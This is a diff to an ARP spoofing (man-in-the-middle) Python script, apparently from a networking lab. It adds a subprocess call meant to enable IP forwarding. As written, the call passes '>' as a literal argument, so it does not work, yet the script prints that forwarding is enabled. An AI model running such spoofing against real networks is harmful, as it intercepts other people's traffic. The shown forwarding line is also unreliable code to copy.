@@ -4,6 +4,7 @@ import scapy.all as scapy
 import time
 import sys
 import optparse
+import subprocess
 
 def get_arguments():
     parse = optparse.OptionParser()
@@ -52,6 +53,8 @@ gateway_ip = "10.0.2.1"
 #python 2.7 and lower
 try:
     sent_packets_count = 0
+    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
+    print("[+] Enabled port forwarding")
     while True:
         spoof(options.target_ip, options.gateway_ip)  # spoofing target
         spoof(options.gateway_ip, options.target_ip)  # spoofing router
@@ -74,4 +77,4 @@ except KeyboardInterrupt:
     #sent_packets_count+=2
     #print("\r[+] Packets Sent: " + str(sent_packets_count), end="") #, to print all in one line and \r overrites the print stmt
     #time.sleep(2)
-
+    
